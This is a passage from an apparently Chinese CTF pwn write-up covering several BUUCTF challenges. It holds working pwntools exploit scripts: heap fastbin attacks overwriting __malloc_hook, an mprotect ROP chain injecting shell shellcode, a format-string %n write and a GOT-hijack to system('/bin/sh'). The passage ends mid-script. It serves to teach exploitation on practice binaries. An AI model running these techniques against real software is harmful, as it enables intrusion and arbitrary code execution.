<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">size</span>):</span></span><br><span class="line">    sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    ru(<span class="string">&#x27;: &#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">idx, data</span>):</span></span><br><span class="line">    sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(data)))</span><br><span class="line">    sa(<span class="string">&#x27;: &#x27;</span>, data)</span><br><span class="line">    ru(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sl(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sl(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&#x27;: \n&#x27;</span>)</span><br><span class="line">    data = p.ru(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	alloc(<span class="number">0x10</span>) <span class="comment"># a0,b1,c2,d3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment"># e4</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># b</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment"># c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c-&gt;fd = e</span></span><br><span class="line">payload = flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x21</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x21</span>,<span class="string">&#x27;\x80&#x27;</span>)</span><br><span class="line">fill(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># e-&gt;chunk_size = 0x21</span></span><br><span class="line">payload = flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment"># c1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment"># e2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># e-&gt;chunk_size = 0x91</span></span><br><span class="line">payload = flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment"># f5</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment"># e, e-&gt;fd = unsorted_head</span></span><br><span class="line"></span><br><span class="line">base = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>])<span class="number">-0x3c4b78</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment"># g4</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment"># g</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># g-&gt;fd = _IO()</span></span><br><span class="line">payload = p64(base+<span class="number">0x3c4aed</span>)</span><br><span class="line">fill(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment"># g5</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment"># _IO()6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># _IO() + 0x13 == __malloc_hook(), one_gadget</span></span><br><span class="line">payload = flat(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x13</span>,p64(base+<span class="number">0x4526a</span>))</span><br><span class="line">fill(<span class="number">6</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc() -&gt; __malloc_hook()</span></span><br><span class="line">alloc(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>


<h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><p>本地运行脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">get_flag = <span class="number">0x80489a0</span></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>,get_flag,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,<span class="number">0x308cd64f</span>,<span class="number">0x195719d1</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> r()</span><br></pre></td></tr></table></figure>

<p>本来这样是可以直接读取 flag 的，但是远程不行。因此远程运行时换了一种更具难度的方法，就是调用<code>mprotect</code>修改<code>bss</code>段权限使得其可执行，随后写入 shellcode。</p>
<p>需要注意<code>mprotect</code>第二个参数要求页对齐，第三个参数为<code>7</code>表示<code>rwx</code>。修改完成后从标准输入读入 shellcode，写入<code>bss_base</code>后返回到<code>bss_base</code>处执行。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pop3 = <span class="number">0x80483b8</span></span><br><span class="line">got_base = <span class="number">0x80eb000</span></span><br><span class="line">bss_base = elf.bss()</span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>,elf.sym[<span class="string">&#x27;mprotect&#x27;</span>],pop3,got_base,<span class="number">0x1000</span>,<span class="number">7</span>,elf.sym[<span class="string">&#x27;read&#x27;</span>],pop3,<span class="number">0</span>,bss_base,<span class="number">0x200</span>,bss_base)</span><br><span class="line">sl(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(asm(shellcraft.sh()))</span><br></pre></td></tr></table></figure>

<h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><p>和上面 get_started 做法一样。我怀疑 BUU 上一题在服务器上放错了二进制文件，也放了这一题的，所以第一个脚本才会无效。</p>
<h2 id="第五空间-2019-决赛-PWN5"><a href="#第五空间-2019-决赛-PWN5" class="headerlink" title="[第五空间 2019 决赛]PWN5"></a>[第五空间 2019 决赛]PWN5</h2><p>长度限制无法栈溢出，但是存在明显的格式化字符串漏洞。通过<code>aaaa %08x %08x ...</code>可以判断偏移为 10。</p>
<p>然后利用<code>%10$n</code>修改<code>0x804c044</code>地址（IDA 得到）处的值即可，最后输入<code>passwd</code>需要与已成功输出的字符数相等。当然，也可以直接修改<code>atoi</code>的 GOT 地址为<code>system</code>的 PLT 地址。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sla(<span class="string">&#x27;:&#x27;</span>, p32(<span class="number">0x804c044</span>) + <span class="string">&#x27;%10$n&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><p>IDA 可知需要让 var 的下标为 13 的元素（也就是第 14 个）等于 17，直接按照需求写脚本即可：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sl(p32(<span class="number">17</span>)*<span class="number">14</span>)</span><br></pre></td></tr></table></figure>

<h2 id="babyfengshui-33c3-2016"><a href="#babyfengshui-33c3-2016" class="headerlink" title="babyfengshui_33c3_2016"></a>babyfengshui_33c3_2016</h2><p>本题源码大致如下，开启了 canary 和 NX：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl __noreturn <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v0; <span class="comment">// [esp+3h] [ebp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> action; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">size_t</span> input; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;0: Add a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1: Delete a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2: Display a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3: Update a user description&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4: Exit&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Action: &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;action) == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !action )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size of description: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%u%c&quot;</span>, &amp;input, &amp;v0);</span><br><span class="line">      add(input);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( action == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">      <span class="keyword">delete</span>((<span class="keyword">unsigned</span> __int8)input);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( action == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">      display((<span class="keyword">unsigned</span> __int8)input);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( action == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">      update(input);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( action == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)total_users &gt; <span class="number">0x31</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;maximum capacity exceeded, bye&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>我们重点关注可能存在漏洞的<code>add</code>和<code>update</code>，首先是<code>add</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__cdecl <span class="title">add</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *desc; <span class="comment">// ST24_4</span></span><br><span class="line">  _DWORD *user; <span class="comment">// ST28_4</span></span><br><span class="line"></span><br><span class="line">  desc = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="built_in">memset</span>(desc, <span class="number">0</span>, size);</span><br><span class="line">  user = <span class="built_in">malloc</span>(<span class="number">0x80</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(user, <span class="number">0</span>, <span class="number">0x80</span>u);</span><br><span class="line">  *user = desc;</span><br><span class="line">  users[(<span class="keyword">unsigned</span> __int8)total_users] = user;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;name: &quot;</span>);</span><br><span class="line">  read_name((<span class="keyword">char</span> *)users[(<span class="keyword">unsigned</span> __int8)total_users] + <span class="number">4</span>, <span class="number">124</span>);</span><br><span class="line">  update(++total_users - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> user;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以大致了解到<code>user</code>结构体大约长这样：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> *description;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">124</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>注意<code>descrption</code>是<code>user</code>开始的地方。</p>
<p>随后发现<code>update</code>中存在一处防护措施：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">sub_8048724</span><span class="params">(<span class="keyword">unsigned</span> __int8 index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+17h] [ebp-11h]</span></span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)total_users &amp;&amp; users[index] )</span><br><span class="line">  &#123;</span><br><span class="line">    len = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;text length: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u%c&quot;</span>, &amp;len, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">char</span> *)(len + *(_DWORD *)users[index]) &gt;= (<span class="keyword">char</span> *)users[index] - <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;my l33t defenses cannot be fooled, cya!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;text: &quot;</span>);</span><br><span class="line">    read_name(*(_DWORD *)users[index], len + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里其实是判断当前<code>user-&gt;description</code>加上输入的字符串长度是否会超过<code>user</code>起始地址-4 的位置，目的很明显是为了防止堆溢出。预期内存布局是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> --------</span><br><span class="line">| Desc0  |</span><br><span class="line"> -------- &lt;- user0</span><br><span class="line">| &amp;Desc0 |</span><br><span class="line"> --------</span><br><span class="line">| name0  |</span><br><span class="line"> --------</span><br><span class="line">| Desc1  |</span><br><span class="line"> -------- &lt;- user1</span><br><span class="line">| &amp;Desc1 |</span><br><span class="line"> --------</span><br><span class="line">| name1  |</span><br><span class="line"> --------</span><br><span class="line">| Desc2  |</span><br><span class="line"> -------- &lt;- user2</span><br><span class="line">| &amp;Desc2 |</span><br><span class="line"> --------</span><br><span class="line">| name2  |</span><br><span class="line"> --------</span><br></pre></td></tr></table></figure>

<p>然而，我们还拥有删除用户的功能。假如我们删除第 0 个用户，那么他拥有的空间就被<code>free()</code>了。这时我们新增用户，由于<code>desc</code>长度可控，我们可以控制其长度让它恰好分配到原来第 0 个用户的空间，从<code>Desc0</code>一直到<code>name0</code>结束。那么此时：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> --------</span><br><span class="line">|        |</span><br><span class="line">|        |</span><br><span class="line">| Desc3  |</span><br><span class="line">|        |</span><br><span class="line">|        |</span><br><span class="line"> --------</span><br><span class="line">| Desc1  |</span><br><span class="line"> -------- &lt;- user1</span><br><span class="line">| &amp;Desc1 |</span><br><span class="line"> --------</span><br><span class="line">| name1  |</span><br><span class="line"> --------</span><br><span class="line">| Desc2  |</span><br><span class="line"> -------- &lt;- user2</span><br><span class="line">| &amp;Desc2 |</span><br><span class="line"> --------</span><br><span class="line">| name2  |</span><br><span class="line"> -------- &lt;- user3</span><br><span class="line">| &amp;Desc3 |</span><br><span class="line"> --------</span><br><span class="line">| name3  |</span><br><span class="line"> --------</span><br></pre></td></tr></table></figure>

<p>不难发现，即使有上述防护措施的限制，我们依然可以溢出到<code>user1</code>并覆盖其中数据。如果把 libc 中函数的 GOT 表地址放进去，然后<code>display</code>函数打印出来，就能泄露 libc 地址。然后进行 GOT 劫持即可 getshell。</p>
<p>需要注意的是，上图中<code>Desc1</code>前和<code>&amp;Desc1</code>前都有 8 字节 chunk header，覆盖时需要考虑它们占的 16B。此外，<code>Desc0+user0</code>原本所占的空间实际上是<code>0x8+0x80+0x8+0x80</code>，而<code>Desc3</code>申请<code>0x100</code>字节时实际占<code>0x8+0x100</code>，前者比后者多出空闲的<code>0x8</code>字节，也需要考虑。因此计算偏移<code>0x100+0x8+0x8+0x80+0x8=0x198</code>。</p>
<p>放上<code>0x198</code>字节的 padding 后，就可以把<code>free</code>的 GOT 地址放在<code>&amp;Desc1</code>处，此时打印出来的就是<code>free</code>的 GOT 地址，从而泄露出 libc。这时再利用更新功能用<code>system.plt</code>覆盖<code>free.got</code>，那么执行<code>free</code>时就会执行<code>system</code>。此时还差一个参数<code>/bin/sh</code>，我们不妨放在<code>Desc2</code>处，那么在删除<code>user2</code>时，有源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">delete</span><span class="params">(<span class="keyword">unsigned</span> __int8 index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)total_users &amp;&amp; users[index] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="keyword">void</span> **)users[index]);</span><br><span class="line">    <span class="built_in">free</span>(users[index]);</span><br><span class="line">    users[index] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里就会执行<code>free(address of /bin/sh)</code>，实际上就是<code>system(&#39;/bin/sh&#39;)</code>。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">max_len, desc_len, text</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;Action: &#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;description: &#x27;</span>, <span class="built_in">str</span>(max_len))</span><br><span class="line">    sla(<span class="string">&#x27;name: &#x27;</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;length: &#x27;</span>, <span class="built_in">str</span>(desc_len))</span><br><span class="line">    sla(<span class="string">&#x27;text: &#x27;</span>, text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;Action: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;Action: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">index, desc_len, text</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;Action: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&#x27;length: &#x27;</span>, <span class="built_in">str</span>(desc_len))</span><br><span class="line">    sla(<span class="string">&#x27;text: &#x27;</span>, text)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x8</span>,<span class="number">0x8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="number">0x19c</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x198</span>+p32(elf.got[<span 